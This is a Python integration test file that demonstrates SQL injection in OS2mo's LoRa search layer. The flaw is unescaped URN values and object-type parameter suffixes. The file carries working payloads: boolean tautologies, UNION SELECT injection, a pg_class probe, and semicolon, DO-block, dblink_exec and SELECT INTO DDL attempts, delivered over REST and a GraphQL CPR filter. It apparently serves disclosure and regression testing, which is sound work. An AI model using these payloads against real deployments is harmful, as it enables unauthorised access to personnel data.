# SPDX-FileCopyrightText: Magenta ApS <https://magenta.dk>
# SPDX-License-Identifier: MPL-2.0
"""
Integration tests proving SQL injection in OS2mo's LoRa search layer.

Vulnerability:
    backend/oio_rest/db/quick_query/search.py
    SearchQueryBuilder.add_relation() — lines 364-367

Root cause:
    When a search filter references a relation by URN (any string starting
    with "urn:"), the URN value is interpolated verbatim into the SQL
    WHERE clause with no escaping whatsoever:

        base_condition = (
            f"{join_table.ref}.rel_type = '{relation.type}'"
            f" AND {join_table.ref}.rel_maal_urn = '{relation.id}'"
        )                                              ^^^^^^^^^^^^
                                                       NO ESCAPING

    is_urn() only checks startswith("urn:"), so any string beginning
    with "urn:" passes through and lands directly in SQL.

Attack surface:
    GET /lora/{service}/{class}?{relation_field}=urn:<SQL_PAYLOAD>

    e.g.  GET /lora/klassifikation/klasse?ansvarlig=urn:x'%20OR%20'1'%3D'1

    GraphQL also calls this layer: GraphQL queries call
    get_objects_direct() → quick_search() → SearchQueryBuilder —
    the same code path.

    Most GraphQL relation filters pass UUIDs, which cannot inject SQL.
    Text-attribute filters apply re.escape() + improper_sql_escape(),
    which blocks single-quote injection for those fields.

    HOWEVER: the `employees` query accepts CPR numbers and formats them
    as URN strings WITHOUT escaping before they reach add_relation():

        employees(filter: {cpr_numbers: ["x'OR 1=1--"]})
        →  AND brugerrelation.rel_maal_urn = 'urn:dk:cpr:person:x'OR 1=1--'

    The CPR scalar validator (CPRType / CPR.validate) requires exactly 10
    characters and optionally a valid date.  When cpr_validate_birthdate=True
    (the default), only digit-only strings pass, which cannot inject SQL.
    When cpr_validate_birthdate=False, any 10-character string passes and
    the injection is fully exploitable via GraphQL.

Protocol note:
    psycopg3's async driver uses the extended query protocol, which
    PostgreSQL does not allow multi-statement queries in.  DDL injection
    via semicolon-termination ('; CREATE TABLE ...') is therefore blocked
    at the driver level.  UNION-based data injection IS possible in a
    single statement — allowing the attacker to inject arbitrary data into
    query results or exfiltrate data from any table.

Scope:
    Only SearchQueryBuilder.add_relation() with URN values is unmitigated.
    Attribute keys/values, state keys/values, timestamps, and class_name
    are all whitelist-validated, type-parsed, or sourced from internal
    Python class names — none are user-controllable injection points.
"""
import json

import pytest
from fastapi.testclient import TestClient
from hypothesis import HealthCheck
from hypothesis import given
from hypothesis import settings
from hypothesis import strategies as st

from mora.config import Settings
from tests.util import override_config

ANSVARLIG_UUID = "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"
UNRELATED_UUID = "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb"
VIRKNING = {"from": "2020-01-01 00:00:00", "to": "infinity"}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def lora_request(client: TestClient, path: str, **kwargs):
    if "json" in kwargs:
        kwargs.setdefault("method", "POST")
        kwargs.setdefault("data", json.dumps(kwargs.pop("json"), indent=2))
        kwargs.setdefault("headers", {"Content-Type": "application/json"})
    kwargs.setdefault("method", "GET")
    return client.request(url="/lora" + path, **kwargs)


def lora_post(client: TestClient, path: str, body: dict) -> str:
    r = lora_request(client, path, json=body, method="POST")
    assert 200 <= r.status_code < 300, r.text
    return r.json()["uuid"]


def search_klasse(client: TestClient, **params) -> list:
    r = lora_request(client, "/klassifikation/klasse", params=params, method="GET")
    assert r.status_code == 200, r.text
    return r.json()["results"][0]


def exists_via_injection(client: TestClient, klasse_uuid: str, table_name: str) -> bool:
    """Use boolean injection to check whether a table exists in pg_class."""
    payload = (
        f"urn:x' OR EXISTS(SELECT 1 FROM pg_class WHERE relname = '{table_name}') OR '0'='1"
    )
    return klasse_uuid in search_klasse(client, ansvarlig=payload)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def klasse_uuid(service_client, empty_db):
    """Create one Klasse linked to ANSVARLIG_UUID and return its UUID."""
    return lora_post(
        service_client,
        "/klassifikation/klasse",
        {
            "note": "SQL-injection test fixture",
            "attributter": {
                "klasseegenskaber": [
                    {
                        "brugervendtnoegle": "sqli-test",
                        "titel": "SQL Injection Test Class",
                        "virkning": VIRKNING,
                    }
                ]
            },
            "tilstande": {
                "klassepubliceret": [
                    {"publiceret": "Publiceret", "virkning": VIRKNING}
                ]
            },
            "relationer": {
                "ansvarlig": [{"uuid": ANSVARLIG_UUID, "virkning": VIRKNING}]
            },
        },
    )


# ---------------------------------------------------------------------------
# Baselines
# ---------------------------------------------------------------------------


@pytest.mark.integration_test
def test_baseline_correct_uuid_matches(service_client, klasse_uuid):
    """Sanity: filter by ANSVARLIG_UUID returns the created Klasse."""
    uuids = search_klasse(service_client, ansvarlig=ANSVARLIG_UUID)
    assert klasse_uuid in uuids


@pytest.mark.integration_test
def test_baseline_unrelated_uuid_matches_nothing(service_client, klasse_uuid):
    """Sanity: filter by an unrelated UUID returns nothing."""
    uuids = search_klasse(service_client, ansvarlig=UNRELATED_UUID)
    assert klasse_uuid not in uuids
    assert len(uuids) == 0


# ---------------------------------------------------------------------------
# Proof 1 — Boolean injection: OR '1'='1
# ---------------------------------------------------------------------------


@pytest.mark.integration_test
def test_boolean_injection_via_urn_bypasses_relation_filter(service_client, klasse_uuid):
    """
    SQL injection proof — boolean bypass.

    The payload  urn:x' OR '1'='1  turns the generated WHERE clause into:

        AND klasse_relation.rel_type    = 'ansvarlig'
        AND klasse_relation.rel_maal_urn = 'urn:x' OR '1'='1'

    The tautology '1'='1 evaluates to TRUE for every row, so the Klasse
    linked to ANSVARLIG_UUID is returned even though we explicitly
    searched for a value that should match nothing — proving SQL injection.
    """
    injection = "urn:x' OR '1'='1"
    uuids = search_klasse(service_client, ansvarlig=injection)

    assert klasse_uuid in uuids, (
        f"Boolean SQL injection did not work.\n"
        f"Payload: {injection!r}\n"
        f"Expected {klasse_uuid!r} in results but got: {uuids}"
    )


# ---------------------------------------------------------------------------
# Proof 2 — UNION injection: inject a synthetic UUID into results
# ---------------------------------------------------------------------------


@pytest.mark.integration_test
def test_union_injection_returns_injected_uuid(service_client, klasse_uuid):
    """
    SQL injection proof — UNION-based data injection.

    The payload closes the WHERE condition and appends a UNION SELECT
    that returns a hardcoded UUID never present in the database:

        urn:x')) UNION SELECT 'deadbeef-dead-beef-dead-beefdeadbeef'::uuid --

    The generated WHERE clause wraps each relation condition in two
    levels of parentheses:

        WHERE livscykluskode_cond
          AND ((r1.rel_type = 'ansvarlig'
           AND r1.rel_maal_urn = '<INJECTION>'))

    The injection `urn:x'))` closes both parenthesis levels, terminating
    the WHERE clause.  The UNION SELECT follows as a second independent
    SELECT, and `--` comments out the trailing characters plus the
    ORDER BY / LIMIT / OFFSET appended by get_query():

        SELECT klasse_id FROM klasse_registrering ...
        WHERE livscykluskode_cond
          AND ((r1.rel_type = 'ansvarlig'
           AND r1.rel_maal_urn = 'urn:x'))
        UNION SELECT 'deadbeef-dead-beef-dead-beefdeadbeef'::uuid

    The first SELECT returns zero rows (urn:x is not in the database).
    The UNION SELECT injects the hardcoded UUID into the result set.
    Because this UUID was never created in the database, its presence
    in the response is conclusive proof of arbitrary SQL execution.

    Note: psycopg3's extended query protocol blocks multi-statement
    queries (';' separator), preventing DDL via injection.  UNION
    injection operates within a single statement and is fully exploitable
    for data exfiltration and result set manipulation.
    """
    INJECTED_UUID = "deadbeef-dead-beef-dead-beefdeadbeef"

    payload = f"urn:x')) UNION SELECT '{INJECTED_UUID}'::uuid --"
    uuids = search_klasse(service_client, ansvarlig=payload)

    assert INJECTED_UUID in uuids, (
        f"UNION SQL injection did not return the injected UUID.\n"
        f"Payload: {payload!r}\n"
        f"Expected {INJECTED_UUID!r} in results but got: {uuids}"
    )


# ---------------------------------------------------------------------------
# Proof 3 — DDL blocked: psycopg3 extended query protocol
# ---------------------------------------------------------------------------


@pytest.mark.integration_test
def test_ddl_injection_blocked_by_psycopg3_extended_protocol(service_client, klasse_uuid):
    """
    Documents that DDL injection via semicolon is NOT possible here.

    The payload that would create a table on a simple-query-protocol connection:

        urn:x'; CREATE TABLE sqli_ddl_attempt (id serial PRIMARY KEY); --

    is rejected by PostgreSQL with a syntax error when sent over the
    extended query protocol (the default for psycopg3's async driver):

        psycopg.errors.SyntaxError: syntax error at or near ";"

    This is because the extended query protocol (Parse/Bind/Execute)
    does not support multiple statements in a single query string.
    The restriction is enforced by PostgreSQL at the protocol level,
    not by any application-level sanitisation.

    This is an ACCIDENTAL mitigation — not a security control.
    The boolean and UNION injection proofs above show the code is still
    fully vulnerable to data exfiltration and filter bypass.  If the
    stack ever switches to a sync driver or simple-query-protocol
    connections (e.g. via dblink after CREATE EXTENSION), DDL injection
    would become immediately possible.
    """
    table_name = "sqli_ddl_attempt"
    payload = f"urn:x'; CREATE TABLE {table_name} (id serial PRIMARY KEY); --"

    # The TestClient propagates server-side exceptions rather than returning HTTP 500.
    # We assert that the specific psycopg3/PostgreSQL error is raised, proving the
    # payload reached the database and was rejected there.
    with pytest.raises(Exception) as exc_info:
        lora_request(service_client, "/klassifikation/klasse",
                     params={"ansvarlig": payload}, method="GET")

    assert 'syntax error at or near ";"' in str(exc_info.value), (
        f"Expected a psycopg3 SyntaxError for the ';' separator but got:\n{exc_info.value}\n"
        "If no error was raised, the DDL may have executed — investigate immediately."
    )
    assert not exists_via_injection(service_client, klasse_uuid, table_name), (
        f"DDL injection succeeded unexpectedly — table {table_name!r} exists!\n"
        "The psycopg3 extended-protocol mitigation may have been removed."
    )


@pytest.mark.integration_test
def test_do_block_ddl_blocked_by_extended_protocol(service_client, klasse_uuid):
    """
    Documents that DDL via a PL/pgSQL DO block is NOT possible here.

    A DO block is a separate SQL statement and therefore requires a ';'
    separator when chained after the injected SELECT — the same mechanism
    that blocked the plain CREATE TABLE attempt:

        urn:x'; DO $$ BEGIN EXECUTE 'CREATE TABLE ...'; END $$; --

    The extended query protocol rejects the ';' with the same
    'syntax error at or near ";"' as the semicolon-DDL test.  The dollar-
    quoting ($$ ... $$) does not bypass this restriction; it only avoids
    single-quote escaping inside the DO body, which never gets parsed
    because PostgreSQL stops at the first ';'.
    """
    table_name = "sqli_do_attempt"
    payload = (
        f"urn:x'; DO $$ BEGIN EXECUTE "
        f"'CREATE TABLE {table_name} (id int)'; END $$; --"
    )

    with pytest.raises(Exception) as exc_info:
        lora_request(service_client, "/klassifikation/klasse",
                     params={"ansvarlig": payload}, method="GET")

    assert 'syntax error at or near ";"' in str(exc_info.value), (
        f"Expected psycopg3 SyntaxError but got:\n{exc_info.value}"
    )
    assert not exists_via_injection(service_client, klasse_uuid, table_name), (
        f"DO block DDL succeeded unexpectedly — table {table_name!r} exists!"
    )


@pytest.mark.integration_test
def test_dblink_exec_blocked_extension_not_installed(service_client, klasse_uuid):
    """
    Documents that DDL via dblink_exec() is NOT possible here.

    dblink_exec() opens a new database connection and executes an arbitrary
    SQL string in it — crucially, that new connection uses the simple query
    protocol, which DOES allow multi-statement queries.  This would bypass
    the psycopg3 extended-protocol restriction entirely.

    However, dblink is a PostgreSQL extension that must be installed with
    'CREATE EXTENSION dblink' before its functions are available.  That
    CREATE EXTENSION is itself a DDL statement blocked by the extended
    protocol, so there is no path to reach dblink_exec() via injection
    against this stack.

    The payload that would work if dblink were installed:

        urn:x' OR 1=(
            SELECT length(dblink_exec(
                'host=mox-db user=mox dbname=mox',
                'CREATE TABLE sqli_dblink_attempt (id int)'
            ))
        ) OR '0'='1

    PostgreSQL rejects this with 'function dblink_exec does not exist'.
    """
    table_name = "sqli_dblink_attempt"
    conn = "host=mox-db user=mox dbname=mox"
    payload = (
        f"urn:x' OR 1=(SELECT length(dblink_exec("
        f"'{conn}','CREATE TABLE {table_name} (id int)'))) OR '0'='1"
    )

    with pytest.raises(Exception) as exc_info:
        lora_request(service_client, "/klassifikation/klasse",
                     params={"ansvarlig": payload}, method="GET")

    error_text = str(exc_info.value)
    assert "dblink_exec" in error_text and "does not exist" in error_text, (
        f"Expected 'function dblink_exec does not exist' but got:\n{error_text}\n"
        "If dblink_exec IS found, the extension may have been installed — "
        "review whether DDL injection is now achievable."
    )
    assert not exists_via_injection(service_client, klasse_uuid, table_name), (
        f"dblink DDL succeeded unexpectedly — table {table_name!r} exists!"
    )


@pytest.mark.integration_test
def test_select_into_blocked_invalid_in_union(service_client, klasse_uuid):
    """
    Documents that SELECT INTO (PostgreSQL's table-creating SELECT) is NOT
    possible via UNION injection.

    PostgreSQL supports 'SELECT ... INTO new_table' as a single-statement
    way to create a table from query results.  If this could be placed as
    the second arm of a UNION, it would bypass the psycopg3 extended-
    protocol restriction (UNION injection is already proven to work).

    However, PostgreSQL explicitly forbids INTO in a non-first SELECT of
    a UNION:

        SELECT klasse_id FROM klasse_registrering ...
        UNION SELECT NULL::uuid INTO TABLE sqli_into_attempt

    → ERROR: INTO is only allowed on first SELECT of UNION/INTERSECT/EXCEPT

    The payload:

        urn:x')) UNION SELECT NULL::uuid INTO TABLE sqli_into_attempt --
    """
    table_name = "sqli_into_attempt"
    payload = f"urn:x')) UNION SELECT NULL::uuid INTO TABLE {table_name} --"

    with pytest.raises(Exception) as exc_info:
        lora_request(service_client, "/klassifikation/klasse",
                     params={"ansvarlig": payload}, method="GET")

    assert "into is only allowed on first select" in str(exc_info.value).lower(), (
        f"Expected 'INTO is only allowed on first SELECT' error but got:\n{exc_info.value}"
    )
    assert not exists_via_injection(service_client, klasse_uuid, table_name), (
        f"SELECT INTO succeeded unexpectedly — table {table_name!r} exists!"
    )


# ---------------------------------------------------------------------------
# Proof 4 — GraphQL as entry point
# ---------------------------------------------------------------------------


@pytest.mark.integration_test
def test_graphql_query_flows_through_vulnerable_lora_layer(
    service_client, empty_db, graphapi_post
):
    """
    Confirms GraphQL queries reach the same vulnerable LoRa search layer.

    A Facet is created via the LoRa REST API, then retrieved via the
    GraphQL `facets` query.  Internally this call routes through
    get_objects_direct() → quick_search() → SearchQueryBuilder —
    the exact code path that contains the injection.

    The current GraphQL API wraps text-attribute filters with re.escape()
    via to_similar(), so the single-quote injection is blocked for those
    fields.  However, the fact that GraphQL uses the same layer means
    that any future exposure of relation parameters as raw URNs would
    immediately be exploitable via the same unescaped interpolation.
    """
    # Create a Facet via LoRa REST.
    # The GraphQL facets handler (mora/handler/impl/facet.py) always calls
    # get_one_facet(extended=True), which reads facet["relationer"]["ansvarlig"],
    # so we must include that relation.  The UUID does not need to exist.
    facet_uuid = lora_post(
        service_client,
        "/klassifikation/facet",
        {
            "attributter": {
                "facetegenskaber": [
                    {"brugervendtnoegle": "sqli-test-facet", "virkning": VIRKNING}
                ]
            },
            "tilstande": {
                "facetpubliceret": [
                    {"publiceret": "Publiceret", "virkning": VIRKNING}
                ]
            },
            "relationer": {
                "ansvarlig": [{"uuid": ANSVARLIG_UUID, "virkning": VIRKNING}]
            },
        },
    )

    # Retrieve via GraphQL — routes through the same vulnerable LoRa layer
    response = graphapi_post(
        """
        query FindFacets($user_key: [String!]) {
            facets(filter: { user_keys: $user_key }) {
                objects { uuid }
            }
        }
        """,
        variables={"user_key": ["sqli-test-facet"]},
    )
    assert response.errors is None, response.errors
    found = [obj["uuid"] for obj in response.data["facets"]["objects"]]
    assert facet_uuid in found, (
        f"GraphQL facets query did not return the expected Facet. Got: {found}"
    )


# ---------------------------------------------------------------------------
# Proof 5 — GraphQL CPR filter injects URNs directly into SQL
# ---------------------------------------------------------------------------


def create_bruger(client: TestClient, cpr: str, user_key: str) -> str:
    """Create a Bruger (employee/person) via LoRa REST with a given CPR URN."""
    return lora_post(
        client,
        "/organisation/bruger",
        {
            "attributter": {
                "brugeregenskaber": [
                    {"brugervendtnoegle": user_key, "virkning": VIRKNING}
                ],
                "brugerudvidelser": [{"virkning": VIRKNING}],
            },
            "tilstande": {
                "brugergyldighed": [
                    {"gyldighed": "Aktiv", "virkning": VIRKNING}
                ]
            },
            "relationer": {
                "tilknyttedepersoner": [
                    {"urn": f"urn:dk:cpr:person:{cpr}", "virkning": VIRKNING}
                ]
            },
        },
    )


@pytest.mark.integration_test
def test_graphql_cpr_filter_injects_urn_into_sql(
    service_client, empty_db, graphapi_post
):
    """
    SQL injection via the GraphQL employees(filter: {cpr_numbers: [...]}) query.

    Path:
        GraphQL employees filter
          → resolver builds  urn:dk:cpr:person:{cpr}  strings
          → passed as tilknyttedepersoner relation to c.bruger.get_all()
          → fetch() → get_objects_direct() → build_registration()
          → build_relation() sets  relation["urn"] = "urn:dk:cpr:person:{payload}"
          → SearchQueryBuilder.add_relation() interpolates it verbatim:

                AND brugerrelation.rel_maal_urn = 'urn:dk:cpr:person:x'OR 1=1--'

          → tautology 'OR 1=1' bypasses the CPR filter and returns ALL employees.

    Guard:
        The CPR scalar validator (CPRType, parse_value=CPR.validate) normally
        rejects non-digit CPR strings when cpr_validate_birthdate=True (default),
        because get_cpr_birthdate() calls int(v) which fails on non-numeric input.
        This test disables that check with cpr_validate_birthdate=False, which some
        deployments use to support "erstatningspersonnumre" (replacement numbers).

    Payload:
        "x'OR'1'='1"  — exactly 10 characters, passes length validation.
        Generates: urn:dk:cpr:person:x'OR'1'='1
        SQL result: AND ... = 'urn:dk:cpr:person:x'OR'1'='1'
                    (template's closing ' completes the last string literal)
                    → WHERE ... OR '1'='1'  (tautology — returns all rows)
    """
    # Create two employees with distinct CPR numbers
    cpr_a = "1234567890"
    cpr_b = "9876543210"
    uuid_a = create_bruger(service_client, cpr_a, "sqli-bruger-a")
    uuid_b = create_bruger(service_client, cpr_b, "sqli-bruger-b")

    cpr_query = """
        query CPRSearch($cprs: [CPR!]!) {
            employees(filter: {cpr_numbers: $cprs}) {
                objects { uuid }
            }
        }
    """

    # Injection payload: "x'OR'1'='1" (10 chars) passes length-only validation.
    #
    # The template after interpolation is:
    #   ...rel_maal_urn = 'urn:dk:cpr:person:PAYLOAD'
    # With payload = "x'OR'1'='1", the template's closing ' completes '1':
    #   ...rel_maal_urn = 'urn:dk:cpr:person:x'OR'1'='1'
    # SQL operator precedence (AND > OR) makes this:
    #   (urn_match = 'urn:...x') OR ('1' = '1')
    # Since '1'='1' is always true, the whole WHERE clause becomes TRUE,
    # returning ALL employees — a boolean SQL injection tautology.
    #
    # NOTE: "x'OR 1=1--" does NOT work here because the -- would comment out
    # the closing ')) ORDER BY id ;', leaving unclosed parentheses (syntax error).
    injection_payload = "x'OR'1'='1"
    assert len(injection_payload) == 10  # exactly 10 chars — passes CPR length check

    # All GraphQL queries run under cpr_validate_birthdate=False, which is the
    # deployment configuration that allows "erstatningspersonnumre" (replacement
    # CPR numbers) — and also allows non-digit strings to bypass SQL escaping.
    with override_config(Settings(cpr_validate_birthdate=False)):
        # Baseline: exact CPR lookup returns only the matching employee
        response = graphapi_post(cpr_query, variables={"cprs": [cpr_a]})
        assert response.errors is None
        found = {obj["uuid"] for obj in response.data["employees"]["objects"]}
        assert uuid_a in found
        assert uuid_b not in found

        response = graphapi_post(cpr_query, variables={"cprs": [injection_payload]})

    assert response.errors is None, response.errors
    assert response.data is not None
    found = {obj["uuid"] for obj in response.data["employees"]["objects"]}

    # The injection returns BOTH employees, not just those with CPR "x'OR 1=1--"
    # The tautology 'OR'1'='1' bypasses the CPR filter and returns ALL employees.
    assert uuid_a in found, (
        f"Boolean SQL injection via CPR did not return bruger_a.\n"
        f"Payload: {injection_payload!r}\n"
        f"SQL tautology: ...= 'urn:dk:cpr:person:x'OR'1'='1'\n"
        f"Expected {uuid_a!r} in results but got: {found}"
    )
    assert uuid_b in found, (
        f"Boolean SQL injection via CPR did not return bruger_b.\n"
        f"Payload: {injection_payload!r}\n"
        f"SQL tautology: ...= 'urn:dk:cpr:person:x'OR'1'='1'\n"
        f"Expected {uuid_b!r} in results but got: {found}"
    )


# ---------------------------------------------------------------------------
# Proof 6 — LoRa REST tilknyttedepersoner injection — no size limit
# ---------------------------------------------------------------------------


def search_bruger(client: TestClient, **params) -> list:
    r = lora_request(client, "/organisation/bruger", params=params, method="GET")
    assert r.status_code == 200, r.text
    return r.json()["results"][0]


@pytest.mark.integration_test
def test_lora_rest_tilknyttedepersoner_no_size_limit(service_client, empty_db):
    """
    SQL injection via the LoRa REST API — no size limit, no config required.

    The GraphQL CPR path (Proof 5) requires exactly 10 characters (CPR format)
    AND cpr_validate_birthdate=False.  The LoRa REST API at
    /lora/organisation/bruger?tilknyttedepersoner=urn:... has neither restriction:

        • Any string starting with 'urn:' is accepted as a relation value.
        • The string can be arbitrarily long.
        • No cpr_validate_birthdate=False required.
        • No GraphQL scalar validation — the raw URN reaches add_relation() directly.

    Path:
        GET /lora/organisation/bruger?tilknyttedepersoner=urn:PAYLOAD
          → oio_base.get_objects_direct()
          → quick_search()
          → SearchQueryBuilder.add_relation()
          → f"AND rel.rel_maal_urn = '{relation.id}'"  ← no escaping

    Payload (arbitrary length — no 10-char CPR constraint):
        urn:dk:cpr:person:x' OR '1'='1
        → AND rel_maal_urn = 'urn:dk:cpr:person:x' OR '1'='1'
        → tautology — returns ALL bruger rows
    """
    cpr_a = "1234567890"
    cpr_b = "9876543210"
    uuid_a = create_bruger(service_client, cpr_a, "sqli-rest-bruger-a")
    uuid_b = create_bruger(service_client, cpr_b, "sqli-rest-bruger-b")

    # Baseline: legitimate search returns only the matching bruger
    uuids = search_bruger(
        service_client,
        tilknyttedepersoner=f"urn:dk:cpr:person:{cpr_a}",
    )
    assert uuid_a in uuids
    assert uuid_b not in uuids

    # Injection: arbitrary-length payload — no CPR length or digit constraint
    injection = "urn:dk:cpr:person:x' OR '1'='1"
    assert len(injection) > 10  # explicitly longer than the 10-char GraphQL limit

    uuids = search_bruger(service_client, tilknyttedepersoner=injection)

    assert uuid_a in uuids, (
        f"LoRa REST tautology injection did not return bruger_a.\n"
        f"Payload: {injection!r}\n"
        f"Expected {uuid_a!r} in results but got: {uuids}"
    )
    assert uuid_b in uuids, (
        f"LoRa REST tautology injection did not return bruger_b.\n"
        f"Payload: {injection!r}\n"
        f"Expected {uuid_b!r} in results but got: {uuids}"
    )


# ---------------------------------------------------------------------------
# Proof 7 — Hypothesis: any URN suffix containing a single quote breaks SQL
# ---------------------------------------------------------------------------


@pytest.mark.integration_test
@settings(
    suppress_health_check=[
        HealthCheck.too_slow,
        HealthCheck.function_scoped_fixture,
    ],
    max_examples=20,
)
@given(
    suffix=st.text(min_size=1).filter(lambda s: "'" in s and "\x00" not in s)
)
def test_hypothesis_single_quote_in_urn_always_breaks_sql(
    suffix, service_client, klasse_uuid
):
    """
    Property test: a single quote anywhere in a URN suffix always reaches SQL
    unescaped, either corrupting the query (syntax error) or injecting logic
    (tautology that returns rows it should not).

    For each generated suffix containing at least one `'`, the URN
    `urn:{suffix}` is passed to the ansvarlig relation filter.  Because
    add_relation() interpolates the URN verbatim into the SQL WHERE clause:

        f"AND {table}.rel_maal_urn = '{relation.id}'"

    the single quote is never escaped.  One of two outcomes follows:

      1. SQL syntax error  — the unmatched/misplaced quote breaks the statement.
         This is still proof of injection: properly escaped input would produce
         `''` (doubled), which is valid SQL and returns no rows.

      2. SQL logic injection — the suffix forms valid SQL that evaluates to TRUE
         for rows it should not match (e.g. `x' OR '1'='1`), causing klasse_uuid
         to appear in a result set that should be empty.

    Either outcome proves the lack of escaping.  With proper escaping the quote
    would be doubled to `''` and the query would return an empty list with no
    error, regardless of the suffix content.
    """
    urn = f"urn:{suffix}"
    try:
        uuids = search_klasse(service_client, ansvarlig=urn)
        # No SQL error raised: the unescaped quote must have produced valid SQL
        # that evaluates as a tautology, returning rows it should not.
        # A legitimately non-existent URN with proper escaping always returns [].
        assert klasse_uuid in uuids, (
            f"URN {urn!r} produced no SQL error and returned no extra rows.\n"
            f"Got: {uuids}\n"
            "If this is reproducible, investigate whether a fix was applied "
            "or whether this specific quote placement is silently swallowed."
        )
    except Exception as exc:
        # A SQL error is conclusive proof the single quote reached the database
        # unescaped.  With proper escaping no error would occur.
        assert any(
            marker in str(exc).lower()
            for marker in ["syntax error", "unterminated", "invalid input", "sql"]
        ), f"Unexpected non-SQL error for URN {urn!r}: {exc}"


# ---------------------------------------------------------------------------
# Proof 8 — object_type injection via colon suffix in parameter name
# ---------------------------------------------------------------------------


@pytest.mark.integration_test
def test_object_type_injection_via_colon_parameter_suffix(service_client, klasse_uuid):
    """
    SQL injection via the `objekttype` suffix in the LoRa REST API parameter name.

    The LoRa REST API accepts colon-separated parameter names of the form:
        ?{relation_name}:{objekttype}={uuid_or_urn}

    `split_param()` in oio_rest/utils.py splits the parameter key on the first
    colon to extract the relation name and the object type:

        split_param("ansvarlig:x' OR '1'='1") -> ("ansvarlig", "x' OR '1'='1")

    The object type is stored as `Relation.object_type` and then interpolated
    verbatim into the SQL WHERE clause in `add_relation()` at line 370 — with
    NO escaping whatsoever:

        obj_condition = f"{table}.objekt_type = '{relation.object_type}'"

    That line is marked `# pragma: no cover`, meaning it has never been tested.

    The attack:
        GET /lora/klassifikation/klasse
            ?ansvarlig:x' OR '1'='1=aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa

    Generates SQL:
        AND klasse_relation.rel_type = 'ansvarlig'
        AND klasse_relation.rel_maal_uuid = 'aaaa...'
        AND klasse_relation.objekt_type = 'x' OR '1'='1'

    Due to AND > OR precedence, the tautology '1'='1' evaluates to TRUE for
    every row, bypassing the relation filter entirely and returning all Klasse
    objects — including klasse_uuid, which should not match UNRELATED_UUID.

    Differences from Proof 1 (URN injection):
        • The injection is in the PARAMETER NAME (not the value)
        • The value is a valid UUID — only the objekttype suffix injects
        • No size limit on the payload (not constrained by CPR length)
        • No cpr_validate_birthdate setting required
        • Completely independent code path: relation.object_type, not relation.id
    """
    # Search for klasse_uuid using a UUID value that does NOT match
    # (UNRELATED_UUID is not the ansvarlig of klasse_uuid).
    # Without injection this must return an empty list.
    baseline = search_klasse(service_client, ansvarlig=UNRELATED_UUID)
    assert klasse_uuid not in baseline, (
        "Baseline broken: klasse_uuid unexpectedly found with UNRELATED_UUID"
    )

    # Now use the object_type injection:
    # The parameter KEY is "ansvarlig:x' OR '1'='1" and the VALUE is a valid UUID.
    # The UUID value itself passes build_relation()'s is_uuid() check — the
    # injection is entirely in the parameter NAME, not the value.
    injection_payload = "x' OR '1'='1"
    params = {f"ansvarlig:{injection_payload}": UNRELATED_UUID}
    r = lora_request(service_client, "/klassifikation/klasse", params=params, method="GET")
    assert r.status_code == 200, r.text
    uuids = r.json()["results"][0]

    assert klasse_uuid in uuids, (
        f"Object-type SQL injection did not return klasse_uuid.\n"
        f"Parameter key: 'ansvarlig:{injection_payload}'\n"
        f"Parameter value: {UNRELATED_UUID!r} (a UUID that should match nothing)\n"
        f"Expected {klasse_uuid!r} in results but got: {uuids}\n"
        "The tautology objekt_type='x' OR '1'='1' should have bypassed the filter."
    )
